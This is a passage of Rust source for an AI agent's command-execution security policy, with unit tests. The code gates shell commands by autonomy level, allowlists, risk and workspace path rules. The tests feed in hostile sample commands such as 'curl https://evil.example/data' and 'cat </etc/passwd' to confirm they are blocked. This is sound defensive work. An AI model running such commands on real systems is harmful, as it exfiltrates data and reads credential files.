    ) -> Result<CommandRiskLevel, String> {
        self.assess_command_execution(command, approved)
            .map(CommandPolicyAssessment::risk)
            .map_err(|err| err.to_string())
    }

    /// Validate full command execution policy and return structured policy
    /// metadata when blocked.
    pub fn validate_command_execution_with_reason(
        &self,
        command: &str,
        approved: bool,
    ) -> Result<CommandRiskLevel, CommandPolicyViolation> {
        self.assess_command_execution(command, approved)
            .map(CommandPolicyAssessment::risk)
    }

    fn assess_command_execution(
        &self,
        command: &str,
        approved: bool,
    ) -> Result<CommandPolicyAssessment, CommandPolicyViolation> {
        let evaluation = self.build_command_policy_evaluation(command)?;
        self.finalize_command_policy_evaluation(&evaluation, approved)
    }

    fn validate_command_autonomy_precheck(
        &self,
        command: &str,
    ) -> Result<(), CommandPolicyViolation> {
        if self.autonomy == AutonomyLevel::ReadOnly {
            return Err(CommandPolicyViolation::new(
                "autonomy.read_only",
                format!(
                    "Command not allowed by security policy (autonomy is read-only): {command}"
                ),
                command,
            ));
        }

        Ok(())
    }

    fn validate_command_shell_structure_precheck(
        &self,
        command: &str,
    ) -> Result<(), CommandPolicyViolation> {
        if self.allow_unsafe_shell_structures {
            return Ok(());
        }

        if let Some(violation) = shell_structure_violation(command) {
            return Err(violation);
        }

        Ok(())
    }

    fn evaluate_command_context_gate<'a>(
        &'a self,
        command: &str,
        segments: &[CommandSegment],
        mode: CommandPolicyMode,
    ) -> Result<(Option<Vec<CommandContextSegmentEval<'a>>>, bool), CommandPolicyViolation> {
        if mode.is_unrestricted() {
            return Ok((None, false));
        }

        let evals = (!self.command_context_rules.is_empty())
            .then(|| self.evaluate_command_context_segments(segments));
        let allow_high_risk_by_context = match evals.as_deref() {
            Some(evals) => {
                self.command_context_rules_violation_with_evals(command, segments, evals)?
            }
            None => false,
        };

        Ok((evals, allow_high_risk_by_context))
    }

    fn validate_command_allowlist_stage(
        &self,
        evaluation: &CommandPolicyEvaluation<'_>,
    ) -> Result<(), CommandPolicyViolation> {
        if evaluation.mode.is_unrestricted() {
            return Ok(());
        }

        if self.command_passes_global_allowlist_phase(
            &evaluation.segments,
            evaluation.context_evals.as_deref(),
        ) {
            return Ok(());
        }

        Err(self.render_allowed_commands_violation(evaluation))
    }

    fn render_allowed_commands_violation(
        &self,
        evaluation: &CommandPolicyEvaluation<'_>,
    ) -> CommandPolicyViolation {
        CommandPolicyViolation::new(
            "autonomy.allowed_commands",
            self.allowed_commands_block_reason(
                evaluation.command,
                &evaluation.segments,
                evaluation.context_evals.as_deref(),
            ),
            evaluation.command,
        )
    }

    fn finalize_command_policy_evaluation(
        &self,
        evaluation: &CommandPolicyEvaluation<'_>,
        approved: bool,
    ) -> Result<CommandPolicyAssessment, CommandPolicyViolation> {
        if evaluation.mode.is_unrestricted() {
            return Ok(CommandPolicyAssessment::unrestricted());
        }

        self.validate_command_path_policy(evaluation.command)?;
        let risk = self.command_risk_level(evaluation.command);
        self.validate_command_risk_policy(
            evaluation.command,
            approved,
            risk,
            evaluation.allow_high_risk_by_context,
        )?;
        Ok(CommandPolicyAssessment::standard(risk))
    }

    fn validate_command_path_policy(&self, command: &str) -> Result<(), CommandPolicyViolation> {
        if let Some(path) = self.forbidden_path_argument(command) {
            return Err(CommandPolicyViolation::new(
                "autonomy.workspace_path_guard",
                format!("Path blocked by security policy: {path}"),
                command,
            ));
        }

        Ok(())
    }

    fn matches_unrestricted_command(&self, command: &str) -> bool {
        let segments = split_unquoted_segments(command);
        let Some((executable, base_cmd)) = segments
            .first()
            .and_then(|segment| Self::segment_command_parts(segment))
        else {
            return false;
        };

        self.unrestricted_commands
            .iter()
            .any(|allowed| is_allowlist_entry_match(allowed, &executable, &base_cmd))
    }

    fn validate_command_risk_policy(
        &self,
        command: &str,
        approved: bool,
        risk: CommandRiskLevel,
        allow_high_risk_by_context: bool,
    ) -> Result<(), CommandPolicyViolation> {
        if risk == CommandRiskLevel::High {
            return self.validate_high_risk_command_policy(
                command,
                approved,
                allow_high_risk_by_context,
            );
        }

        if risk == CommandRiskLevel::Medium
            && self.autonomy == AutonomyLevel::Supervised
            && self.require_approval_for_medium_risk
            && !approved
        {
            return Err(CommandPolicyViolation::new(
                "autonomy.require_approval_for_medium_risk",
                "Command requires explicit approval (approved=true): medium-risk operation",
                command,
            ));
        }

        Ok(())
    }

    fn validate_high_risk_command_policy(
        &self,
        command: &str,
        approved: bool,
        allow_high_risk_by_context: bool,
    ) -> Result<(), CommandPolicyViolation> {
        if self.block_high_risk_commands && !allow_high_risk_by_context {
            let lower = command.to_ascii_lowercase();
            if lower.contains("curl") || lower.contains("wget") {
                return Err(CommandPolicyViolation::new(
                    "autonomy.block_high_risk_commands",
                    "Command blocked: high-risk command is disallowed by policy. Shell curl/wget are blocked; use `http_request` or `web_fetch` with configured allowed_domains.",
                    command,
                ));
            }
            return Err(CommandPolicyViolation::new(
                "autonomy.block_high_risk_commands",
                "Command blocked: high-risk command is disallowed by policy",
                command,
            ));
        }

        if self.autonomy == AutonomyLevel::Supervised && !approved {
            return Err(CommandPolicyViolation::new(
                "autonomy.require_approval_for_high_risk",
                "Command requires explicit approval (approved=true): high-risk operation",
                command,
            ));
        }

        Ok(())
    }

    /// Check whether a command is allowed by the shell whitelist layers.
    ///
    /// `allowed_commands` remains the global executable gate,
    /// `command_context_rules` can deny matching segments or explicitly admit
    /// them when the global list would otherwise reject them, and
    /// `allow_unsafe_shell_structures` controls whether shell operators are
    /// blocked before the allowlist logic runs.
    ///
    fn is_command_allowed_under_policy(&self, command: &str) -> bool {
        self.build_command_policy_evaluation(command).is_ok()
    }

    fn command_passes_global_allowlist_phase(
        &self,
        segments: &[CommandSegment],
        evals: Option<&[CommandContextSegmentEval<'_>]>,
    ) -> bool {
        !segments.is_empty()
            && segments
                .iter()
                .enumerate()
                .all(|(index, (executable, base_cmd, args))| {
                    let eval = evals.and_then(|values| values.get(index));
                    self.segment_passes_allowlist_phase(executable, base_cmd, args, eval)
                })
    }

    // ── Layered Command Allowlist ──────────────────────────────────────────
    // Defence-in-depth: five independent gates run in order before the
    // per-segment allowlist check. Each gate targets a specific bypass
    // technique. If any gate rejects, the whole command is blocked.

    /// Check if a shell command is allowed.
    ///
    /// Validates the **entire** command string, not just the first word:
    /// - Uses `allowed_commands` as the global executable allowlist
    /// - Applies `command_context_rules` per segment before allowlist matching
    /// - Keeps shell operators gated by `allow_unsafe_shell_structures`
    /// - Blocks subshell operators (`` ` ``, `$(`) that hide arbitrary execution
    /// - Splits on command separators (`|`, `&&`, `||`, `;`, newlines) and
    ///   validates each sub-command against the allowlist
    /// - Blocks single `&` background chaining (`&&` remains supported)
    /// - Blocks shell redirections (`<`, `>`, `>>`) that can bypass path policy
    /// - Blocks dangerous arguments (e.g. `find -exec`, `git config`)
    pub fn is_command_allowed(&self, command: &str) -> bool {
        self.is_command_allowed_under_policy(command)
    }

    /// Check for dangerous arguments that allow sub-command execution.
    fn is_args_safe(&self, base: &str, args: &[String]) -> bool {
        let base = base.to_ascii_lowercase();
        match base.as_str() {
            "find" => {
                // find -exec and find -ok allow arbitrary command execution
                !args.iter().any(|arg| arg == "-exec" || arg == "-ok")
            }
            "git" => {
                // Global git config injection can be used to set dangerous options
                // (e.g., pager/editor/credential helpers) even without `git config`.
                if args.iter().any(|arg| {
                    arg == "-c"
                        || arg == "--config"
                        || arg.starts_with("--config=")
                        || arg == "--config-env"
                        || arg.starts_with("--config-env=")
                }) {
                    return false;
                }

                // Determine subcommand by first non-option token.
                let Some(subcommand_index) = args.iter().position(|arg| !arg.starts_with('-'))
                else {
                    return true;
                };
                let subcommand = args[subcommand_index].as_str();

                // `git alias` can create executable aliases.
                if subcommand == "alias" || subcommand.starts_with("alias.") {
                    return false;
                }

                // Only `git config` needs special handling. Other git subcommands are
                // allowed after the global option checks above.
                if subcommand != "config" {
                    return true;
                }

                let config_args = &args[subcommand_index + 1..];

                // Allow ONLY read-only operations.
                let has_readonly_flag = config_args.iter().any(|arg| {
                    matches!(
                        arg.as_str(),
                        "--get" | "--list" | "-l" | "--get-all" | "--get-regexp" | "--get-urlmatch"
                    )
                });
                if !has_readonly_flag {
                    return false;
                }

                // Explicit write/edit operations must never be mixed with reads.
                let has_write_flag = config_args.iter().any(|arg| {
                    matches!(
                        arg.as_str(),
                        "--add"
                            | "--replace-all"
                            | "--unset"
                            | "--unset-all"
                            | "--edit"
                            | "-e"
                            | "--rename-section"
                            | "--remove-section"
                    )
                });
                if has_write_flag {
                    return false;
                }

                // Reject unknown config flags to avoid option-based bypasses.
                let has_unknown_flag = config_args.iter().any(|arg| {
                    if !arg.starts_with('-') {
                        return false;
                    }

                    let is_known_flag = matches!(
                        arg.as_str(),
                        "--get"
                            | "--list"
                            | "-l"
                            | "--get-all"
                            | "--get-regexp"
                            | "--get-urlmatch"
                            | "--global"
                            | "--system"
                            | "--local"
                            | "--worktree"
                            | "--show-origin"
                            | "--show-scope"
                            | "--null"
                            | "-z"
                            | "--name-only"
                            | "--includes"
                            | "--no-includes"
                    ) || arg == "--file"
                        || arg == "-f"
                        || arg.starts_with("--file=")
                        || arg == "--blob"
                        || arg.starts_with("--blob=")
                        || arg == "--default"
                        || arg.starts_with("--default=")
                        || arg == "--type"
                        || arg.starts_with("--type=");

                    !is_known_flag
                });
                if has_unknown_flag {
                    return false;
                }

                true
            }
            _ => true,
        }
    }

    /// Return the first path-like argument blocked by path policy.
    ///
    /// This is best-effort token parsing for shell commands and is intended
    /// as a safety gate before command execution.
    pub fn forbidden_path_argument(&self, command: &str) -> Option<String> {
        let forbidden_candidate = |raw: &str| {
            let candidate = strip_wrapping_quotes(raw).trim();
            if candidate.is_empty() || candidate.contains("://") {
                return None;
            }
            if looks_like_path(candidate) && !self.is_path_allowed(candidate) {
                Some(candidate.to_string())
            } else {
                None
            }
        };

        for segment in split_unquoted_segments(command) {
            let cmd_part = skip_env_assignments(&segment);
            let words = split_shell_words(cmd_part);
            let Some(executable) = words.first() else {
                continue;
            };

            // Cover inline forms like `cat</etc/passwd`.
            if let Some(target) = redirection_target(strip_wrapping_quotes(executable)) {
                if let Some(blocked) = forbidden_candidate(target) {
                    return Some(blocked);
                }
            }

            for token in words.iter().skip(1) {
                let candidate = strip_wrapping_quotes(token).trim();
                if candidate.is_empty() || candidate.contains("://") {
                    continue;
                }

                if let Some(target) = redirection_target(candidate) {
                    if let Some(blocked) = forbidden_candidate(target) {
                        return Some(blocked);
                    }
                }

                // Handle option assignment forms like `--file=/etc/passwd`.
                if candidate.starts_with('-') {
                    if let Some((_, value)) = candidate.split_once('=') {
                        if let Some(blocked) = forbidden_candidate(value) {
                            return Some(blocked);
                        }
                    }
                    if let Some(value) = attached_short_option_value(candidate) {
                        if let Some(blocked) = forbidden_candidate(value) {
                            return Some(blocked);
                        }
                    }
                    continue;
                }

                if let Some(blocked) = forbidden_candidate(candidate) {
                    return Some(blocked);
                }
            }
        }

        None
    }

    // ── Path Validation ────────────────────────────────────────────────
    // Layered checks: null-byte injection → component-level traversal →
    // URL-encoded traversal → tilde expansion → absolute-path block →
    // forbidden-prefix match. Each layer addresses a distinct escape
    // technique; together they enforce workspace confinement.

    fn resolve_policy_path(&self, path: &str) -> PathBuf {
        let expanded = expand_user_path(path);
        if expanded.is_absolute() || expanded.has_root() {
            expanded
        } else {
            self.workspace_dir.join(expanded)
        }
    }

    fn strongest_matching_allowed_root(
        &self,
        path: &Path,
        canonicalize_roots: bool,
        include_workspace_root: bool,
    ) -> Option<PathBuf> {
        self.allowed_roots
            .iter()
            .map(|root| {
                let normalized = if root.is_absolute() || root.has_root() {
                    root.clone()
                } else {
                    self.workspace_dir.join(root)
                };
                if canonicalize_roots {
                    normalized.canonicalize().unwrap_or(normalized)
                } else {
                    normalized
                }
            })
            .filter(|root| path.starts_with(root))
            .chain(include_workspace_root.then(|| {
                let workspace_root = if canonicalize_roots {
                    self.workspace_dir
                        .canonicalize()
                        .unwrap_or_else(|_| self.workspace_dir.clone())
                } else {
                    self.workspace_dir.clone()
                };
                path.starts_with(&workspace_root).then_some(workspace_root)
            })
            .flatten())
            .max_by_key(|root| root.components().count())
    }

    fn strongest_matching_forbidden_path(
        &self,
        path: &Path,
        canonicalize_roots: bool,
    ) -> Option<PathBuf> {
        self.forbidden_paths
            .iter()
            .map(|forbidden| {
                let normalized = self.resolve_policy_path(forbidden);
                if canonicalize_roots {
                    normalized.canonicalize().unwrap_or(normalized)
                } else {
                    normalized
                }
            })
            .filter(|forbidden| path.starts_with(forbidden))
            .max_by_key(|forbidden| forbidden.components().count())
    }

    fn explicit_path_policy_allows(
        &self,
        path: &Path,
        canonicalize_roots: bool,
        include_workspace_root: bool,
    ) -> Option<bool> {
        let allowed =
            self.strongest_matching_allowed_root(path, canonicalize_roots, include_workspace_root);
        let forbidden = self.strongest_matching_forbidden_path(path, canonicalize_roots);

        match (allowed, forbidden) {
            (Some(allowed_root), Some(forbidden_root)) => {
                let allowed_depth = allowed_root.components().count();
                let forbidden_depth = forbidden_root.components().count();
                Some(allowed_depth > forbidden_depth)
            }
            (Some(_), None) => Some(true),
            (None, Some(_)) => Some(false),
            (None, None) => None,
        }
    }

    /// Check if a file path is allowed (no path traversal, within workspace)
    pub fn is_path_allowed(&self, path: &str) -> bool {
        if path == "/" || path == "\\" {
            return false;
        }

        // Block null bytes (can truncate paths in C-backed syscalls)
        if path.contains('\0') {
            return false;
        }

        // Block path traversal: check for ".." as a path component
        if Path::new(path)
            .components()
            .any(|c| matches!(c, std::path::Component::ParentDir))
        {
            return false;
        }

        // Block URL-encoded traversal attempts (e.g. ..%2f)
        let lower = path.to_lowercase();
        if lower.contains("..%2f") || lower.contains("%2f..") {
            return false;
        }

        // Reject "~user" forms because the shell expands them at runtime and
        // they can escape workspace policy.
        if path.starts_with('~') && path != "~" && !path.starts_with("~/") {
            return false;
        }

        // Expand "~" for consistent matching with policy paths.
        let expanded_path = expand_user_path(path);
        let policy_path = if expanded_path.is_absolute() {
            expanded_path.clone()
        } else {
            self.workspace_dir.join(&expanded_path)
        };
        let explicit_allow =
            self.explicit_path_policy_allows(&policy_path, false, false) == Some(true);

        // Block absolute paths when workspace_only is set unless the path lives
        // under an explicitly allowlisted root.
        if self.workspace_only && is_policy_absolute_path(path, &expanded_path) && !explicit_allow {
            return false;
        }

        // Explicit path policy uses the most-specific matching root so a
        // narrow allow can override a broad deny, while a narrower deny still
        // beats a broader allow.
        if self.explicit_path_policy_allows(&policy_path, false, false) == Some(false) {
            return false;
        }

        true
    }

    /// Validate that a resolved path is inside the workspace or an allowed root.
    /// Call this AFTER joining `workspace_dir` + relative path and canonicalizing.
    pub fn is_resolved_path_allowed(&self, resolved: &Path) -> bool {
        // Prefer canonical workspace root so `/a/../b` style config paths don't
        // cause false positives or negatives.
        let workspace_root = self
            .workspace_dir
            .canonicalize()
            .unwrap_or_else(|_| self.workspace_dir.clone());

        match self.explicit_path_policy_allows(resolved, true, true) {
            Some(true) => return true,
            Some(false) => return false,
            None => {}
        }

        if resolved.starts_with(&workspace_root) {
            return true;
        }

        // When workspace_only is disabled the user explicitly opted out of
        // workspace confinement after forbidden-path checks are applied.
        if !self.workspace_only {
            return true;
        }

        false
    }

    pub fn resolved_path_violation_message(&self, resolved: &Path) -> String {
        let guidance = if self.allowed_roots.is_empty() {
            "Add the directory to [autonomy].allowed_roots (for example: allowed_roots = [\"/absolute/path\"]), or move the file into the workspace."
        } else {
            "Add a matching parent directory to [autonomy].allowed_roots, or move the file into the workspace."
        };

        format!(
            "Resolved path escapes workspace allowlist: {}. {}",
            resolved.display(),
            guidance
        )
    }

    /// Check if autonomy level permits any action at all
    pub fn can_act(&self) -> bool {
        self.autonomy != AutonomyLevel::ReadOnly
    }

    // ── Tool Operation Gating ──────────────────────────────────────────────
    // Read operations bypass autonomy and rate checks because they have
    // no side effects. Act operations must pass both the autonomy gate
    // (not read-only) and the sliding-window rate limiter.

    /// Enforce policy for a tool operation.
    ///
    /// Read operations are always allowed by autonomy/rate gates.
    /// Act operations require non-readonly autonomy and available action budget.
    pub fn enforce_tool_operation(
        &self,
        operation: ToolOperation,
        operation_name: &str,
    ) -> Result<(), String> {
        match operation {
            ToolOperation::Read => Ok(()),
            ToolOperation::Act => {
                if !self.can_act() {
                    return Err(tool_operation_policy_block_event(
                        READ_ONLY_POLICY_ID,
                        READ_ONLY_REASON,
                        operation_name,
                    ));
                }

                if !self.record_action() {
                    return Err(tool_operation_policy_block_event(
                        MAX_ACTIONS_POLICY_ID,
                        RATE_LIMIT_BUDGET_REASON,
                        operation_name,
                    ));
                }

                Ok(())
            }
        }
    }

    /// Record an action and check if the rate limit has been exceeded.
    /// Returns `true` if the action is allowed, `false` if rate-limited.
    pub fn record_action(&self) -> bool {
        let count = self.tracker.record();
        count <= self.max_actions_per_hour as usize
    }

    /// Check if the rate limit would be exceeded without recording.
    pub fn is_rate_limited(&self) -> bool {
        self.tracker.count() >= self.max_actions_per_hour as usize
    }

    /// Build from config sections
    /// Produce a concise security-constraint summary suitable for periodic
    /// re-injection into the conversation (safety heartbeat).
    ///
    /// The output is intentionally short (~100-150 tokens) so the token
    /// overhead per heartbeat is negligible.
    pub fn summary_for_heartbeat(&self) -> String {
        let autonomy_label = match self.autonomy {
            AutonomyLevel::ReadOnly => "read_only — side-effecting actions are blocked",
            AutonomyLevel::Supervised => "supervised — destructive actions require approval",
            AutonomyLevel::Full => "full — autonomous execution within policy bounds",
        };

        let workspace = self.workspace_dir.display();
        let ws_only = self.workspace_only;

        let forbidden_preview = preview_command_entries(
            &self.forbidden_paths,
            8,
            CommandPreviewStyle::Plain,
        )
        .render("none", "wildcard *", None);

        let commands_preview =
            match preview_command_entries(&self.allowed_commands, 8, CommandPreviewStyle::Plain) {
                CommandPreview::Empty => "none (all rejected)".to_string(),
                CommandPreview::Wildcard => "wildcard * (command-name gate open)".to_string(),
                CommandPreview::Listed { shown, hidden } => {
                    if hidden > 0 {
                        format!("{} (+ {hidden} more rejected)", shown.join(", "))
                    } else {
                        format!("{} (others rejected)", shown.join(", "))
                    }
                }
            };
        let unrestricted_preview =
            preview_command_entries(&self.unrestricted_commands, 8, CommandPreviewStyle::Plain)
                .render("none", "wildcard *", None);

        let high_risk = if self.block_high_risk_commands {
            "blocked"
        } else {
            "allowed (caution)"
        };

        format!(
            "- Autonomy: {autonomy_label}\n\
             - Workspace: {workspace} (workspace_only: {ws_only})\n\
             - Forbidden paths: {forbidden_preview}\n\
             - Allowed commands: {commands_preview}\n\
             - Unrestricted commands: {unrestricted_preview}\n\
             - High-risk commands: {high_risk}\n\
             - Do not exfiltrate data, bypass approval, or run destructive commands without asking."
        )
    }

    pub fn from_config(
        autonomy_config: &crate::config::AutonomyConfig,
        workspace_dir: &Path,
    ) -> Self {
        Self {
            autonomy: autonomy_config.level,
            workspace_dir: workspace_dir.to_path_buf(),
            workspace_only: autonomy_config.workspace_only,
            allowed_commands: autonomy_config.allowed_commands.clone(),
            unrestricted_commands: autonomy_config.unrestricted_commands.clone(),
            command_context_rules: autonomy_config.command_context_rules.clone(),
            forbidden_paths: autonomy_config.forbidden_paths.clone(),
            allowed_roots: autonomy_config
                .allowed_roots
                .iter()
                .map(|root| {
                    let expanded = expand_user_path(root);
                    if expanded.is_absolute() || expanded.has_root() {
                        expanded
                    } else {
                        workspace_dir.join(expanded)
                    }
                })
                .collect(),
            max_actions_per_hour: autonomy_config.max_actions_per_hour,
            max_cost_per_day_cents: autonomy_config.max_cost_per_day_cents,
            require_approval_for_medium_risk: autonomy_config.require_approval_for_medium_risk,
            block_high_risk_commands: autonomy_config.block_high_risk_commands,
            allow_unsafe_shell_structures: autonomy_config.allow_unsafe_shell_structures,
            shell_env_passthrough: autonomy_config.shell_env_passthrough.clone(),
            allow_sensitive_file_reads: autonomy_config.allow_sensitive_file_reads,
            allow_sensitive_file_writes: autonomy_config.allow_sensitive_file_writes,
            tracker: ActionTracker::new(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_policy() -> SecurityPolicy {
        SecurityPolicy::default()
    }

    fn readonly_policy() -> SecurityPolicy {
        SecurityPolicy {
            autonomy: AutonomyLevel::ReadOnly,
            ..SecurityPolicy::default()
        }
    }

    fn full_policy() -> SecurityPolicy {
        SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            ..SecurityPolicy::default()
        }
    }

    // ── AutonomyLevel ────────────────────────────────────────

    #[test]
    fn autonomy_default_is_supervised() {
        assert_eq!(AutonomyLevel::default(), AutonomyLevel::Supervised);
    }

    #[test]
    fn autonomy_serde_roundtrip() {
        let json = serde_json::to_string(&AutonomyLevel::Full).unwrap();
        assert_eq!(json, "\"full\"");
        let parsed: AutonomyLevel = serde_json::from_str("\"readonly\"").unwrap();
        assert_eq!(parsed, AutonomyLevel::ReadOnly);
        let parsed2: AutonomyLevel = serde_json::from_str("\"supervised\"").unwrap();
        assert_eq!(parsed2, AutonomyLevel::Supervised);
    }

    #[test]
    fn can_act_readonly_false() {
        assert!(!readonly_policy().can_act());
    }

    #[test]
    fn can_act_supervised_true() {
        assert!(default_policy().can_act());
    }

    #[test]
    fn can_act_full_true() {
        assert!(full_policy().can_act());
    }

    #[test]
    fn summarize_command_policy_block_extracts_policy_and_command() {
        let violation = CommandPolicyViolation::new(
            "autonomy.allowed_commands",
            "Command blocked by allowed_commands: no entry in autonomy.allowed_commands matched executable=curl; segment_command=curl; context_override=none; full_command=curl https://evil.example",
            "curl https://evil.example",
        );
        let summary = summarize_command_policy_block(&violation.format_block_message(), 64)
            .expect("formatted block message should parse");
        assert_eq!(
            summary,
            "policy=autonomy.allowed_commands; command=curl https://evil.example; config_key=autonomy.allowed_commands"
        );
    }

    #[test]
    fn parse_command_policy_block_event_extracts_fields() {
        let message = "blocked by security policy: policy=autonomy.allowed_commands; command=curl https://evil.example; config_key=autonomy.allowed_commands; reason=Command blocked by allowed_commands: no entry in autonomy.allowed_commands matched executable=curl; segment_command=curl; context_override=none; full_command=curl https://evil.example";
        let parsed = parse_command_policy_block_event(message)
            .expect("formatted block message should parse into structured event");
        assert_eq!(parsed.policy_id, "autonomy.allowed_commands");
        assert_eq!(parsed.command_fragment, "curl https://evil.example");
        assert_eq!(parsed.config_key(), Some("autonomy.allowed_commands"));
        assert_eq!(
            parsed.reason,
            "Command blocked by allowed_commands: no entry in autonomy.allowed_commands matched executable=curl; segment_command=curl; context_override=none; full_command=curl https://evil.example"
        );
    }

    #[test]
    fn parse_command_policy_block_event_preserves_explicit_config_key() {
        let message = "blocked by security policy: policy=runtime.guard.custom; command=shell; config_key=autonomy.allowed_commands; reason=custom guard blocked shell";
        let parsed = parse_command_policy_block_event(message)
            .expect("formatted block message should preserve explicit config_key");
        assert_eq!(parsed.policy_id, "runtime.guard.custom");
        assert_eq!(parsed.command_fragment, "shell");
        assert_eq!(parsed.config_key(), Some("autonomy.allowed_commands"));
        assert_eq!(parsed.reason, "custom guard blocked shell");
    }

    #[test]
    fn is_command_policy_block_message_accepts_error_prefixed_payload() {
        let message =
            "Error: blocked by security policy: policy=autonomy.allowed_commands; command=curl https://evil.example; reason=Command blocked by allowed_commands: no entry in autonomy.allowed_commands matched executable=curl; segment_command=curl; context_override=none; full_command=curl https://evil.example";
        assert!(is_command_policy_block_message(message));
        let summary = summarize_command_policy_block(message, 64)
            .expect("error-prefixed block message should still summarize");
        assert_eq!(
            summary,
            "policy=autonomy.allowed_commands; command=curl https://evil.example; config_key=autonomy.allowed_commands"
        );
    }

    #[test]
    fn policy_block_config_key_maps_shell_structure_policy_to_opt_in_flag() {
        let key = policy_block_config_key("autonomy.shell_structure.redirection")
            .expect("shell structure policy should map to config key");
        assert_eq!(key, "autonomy.allow_unsafe_shell_structures");
    }

    #[test]
    fn policy_block_config_key_maps_command_context_rules_policy() {
        let key = policy_block_config_key(COMMAND_CONTEXT_RULES_POLICY_ID)
            .expect("command_context_rules policy should map to config key");
        assert_eq!(key, COMMAND_CONTEXT_RULES_POLICY_ID);
    }

    #[test]
    fn policy_block_config_key_maps_runtime_approval_policy() {
        let key = policy_block_config_key("runtime.approval.non_cli_context_required")
            .expect("runtime approval policy should map to config key");
        assert_eq!(key, "autonomy.auto_approve");
    }

    #[test]
    fn policy_block_render_report_fallback_preserves_command_preview() {
        let report = PolicyBlockRenderReport::from_message_or_fallback(
            "plain blocked output",
            Some("unknown"),
            Some("shell"),
            Some("unknown"),
            "",
            false,
            72,
            120,
        )
        .expect("fallback should produce a render report")
        .with_default_fields("unknown", "shell", "unknown");
        assert_eq!(report.policy_id.as_deref(), Some("unknown"));
        assert_eq!(report.command_preview.as_deref(), Some("shell"));
        assert_eq!(report.config_key.as_deref(), Some("unknown"));
        assert_eq!(report.reason_preview, "plain blocked output");
    }

    #[test]
    fn policy_block_render_report_derives_config_key_from_policy_id() {
        let report = PolicyBlockRenderReport::from_message_or_fallback(
            "plain blocked output",
            Some("autonomy.read_only"),
            Some("shell"),
            None,
            "blocked",
            false,
            72,
            120,
        )
        .expect("fallback should produce a render report");
        assert_eq!(
            report.summary().as_deref(),
            Some("policy=autonomy.read_only; command=shell; config_key=autonomy.read_only")
        );
        assert_eq!(
            report.detail("blocked"),
            "blocked; policy=autonomy.read_only command=shell config_key=autonomy.read_only"
        );
    }

    #[test]
    fn policy_block_render_report_with_default_fields_preserves_defaults_and_context() {
        let report = PolicyBlockRenderReport::from_message_or_fallback(
            "blocked by security policy: policy=autonomy.command_context_rules; command=curl https://evil.example; reason=Command blocked by command_context_rules: no allow rule matched constraints for 'curl'; rule_index=0; command_context=action=allow, commands=curl, allowed_domains=api.internal",
            None,
            None,
            None,
            "blocked",
            false,
            72,
            120,
        )
        .expect("structured event should produce a render report");

        let report = report.with_default_fields("unknown", "shell", "unknown");
        assert_eq!(
            report.policy_id.as_deref(),
            Some("autonomy.command_context_rules")
        );
        assert_eq!(
            report.command_preview.as_deref(),
            Some("curl https://evil.example")
        );
        assert_eq!(
            report.config_key.as_deref(),
            Some("autonomy.command_context_rules")
        );
        assert_eq!(report.rule_index.as_deref(), Some("0"));
        assert_eq!(
            report.command_context.as_deref(),
            Some("action=allow, commands=curl, allowed_domains=api.internal")
        );
    }

    #[test]
    fn format_policy_block_event_uses_placeholder_command_when_missing() {
        let message =
            format_policy_block_event("autonomy.read_only", "autonomy is read-only", None);
        assert!(message.contains("policy=autonomy.read_only"));
        assert!(message.contains("command=<none>"));
        assert!(message.contains("config_key=autonomy.read_only"));
        assert!(message.contains("reason=autonomy is read-only"));
    }

    #[test]
    fn validate_command_execution_reports_shell_structure_policy_id() {
        let p = default_policy();
        let violation = p
            .validate_command_execution_with_reason("cat </etc/passwd", false)
            .expect_err("redirection should be blocked with explicit structure policy");
        assert_eq!(
            violation.policy_id(),
            "autonomy.shell_structure.redirection"
        );
        assert!(violation
            .to_string()
            .contains("allow_unsafe_shell_structures"));
    }

    #[test]
    fn command_context_rules_block_when_allow_constraints_do_not_match() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            block_high_risk_commands: false,
            allowed_commands: vec!["curl".into()],
            command_context_rules: vec![crate::config::CommandContextRuleConfig {
                command: "curl".into(),
                action: crate::config::CommandContextRuleAction::Allow,
                allowed_domains: vec!["api.example.com".into()],
                allowed_path_prefixes: vec![],
                denied_path_prefixes: vec![],
                allow_high_risk: false,
            }],
            ..SecurityPolicy::default()
        };

        let violation = p
            .validate_command_execution_with_reason("curl https://evil.example/data", true)
            .expect_err("domain mismatch should be blocked by command_context_rules");
        assert_eq!(violation.policy_id(), "autonomy.command_context_rules");
        assert!(violation
            .to_string()
            .contains("no allow rule matched constraints"));
        assert!(violation.to_string().contains("allow_rule_count=1"));
        assert!(violation.to_string().contains("rule_action=allow"));
        assert!(violation.to_string().contains("rule_command=curl"));
    }

    #[test]
    fn command_context_rules_allow_high_risk_override_applies_when_rule_matches() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            block_high_risk_commands: true,
            allowed_commands: vec!["curl".into()],
            command_context_rules: vec![crate::config::CommandContextRuleConfig {
                command: "curl".into(),
                action: crate::config::CommandContextRuleAction::Allow,
                allowed_domains: vec!["api.example.com".into()],
                allowed_path_prefixes: vec![],
                denied_path_prefixes: vec![],
                allow_high_risk: true,
            }],
            ..SecurityPolicy::default()
        };

        let allowed = p.validate_command_execution("curl https://api.example.com/v1", true);
        assert_eq!(allowed.unwrap(), CommandRiskLevel::High);
    }

    #[test]
    fn command_context_rules_allow_can_override_global_allowlist() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            block_high_risk_commands: false,
            allowed_commands: vec!["git".into()],
            command_context_rules: vec![crate::config::CommandContextRuleConfig {
                command: "curl".into(),
                action: crate::config::CommandContextRuleAction::Allow,
                allowed_domains: vec!["api.example.com".into()],
                allowed_path_prefixes: vec![],
                denied_path_prefixes: vec![],
                allow_high_risk: false,
            }],
            ..SecurityPolicy::default()
        };

        let allowed = p
            .validate_command_execution_with_reason("curl https://api.example.com/v1", true)
            .expect("matching allow rule should override global allowlist");
        assert_eq!(allowed, CommandRiskLevel::High);

        let blocked = p
            .validate_command_execution_with_reason("curl https://evil.example/v1", true)
            .expect_err("non-matching context must remain blocked");
        assert_eq!(blocked.policy_id(), "autonomy.command_context_rules");
    }

    #[test]
    fn command_context_allow_rule_honors_more_specific_allowed_path_prefix() {
        let root =
            std::env::temp_dir().join("zeroclaw_test_command_context_allow_path_specificity");
        let workspace = root.join("workspace");
        let allowed = workspace.join("sandbox").join("allow");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(allowed.join("nested")).unwrap();
        std::fs::create_dir_all(workspace.join("sandbox").join("blocked")).unwrap();

        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
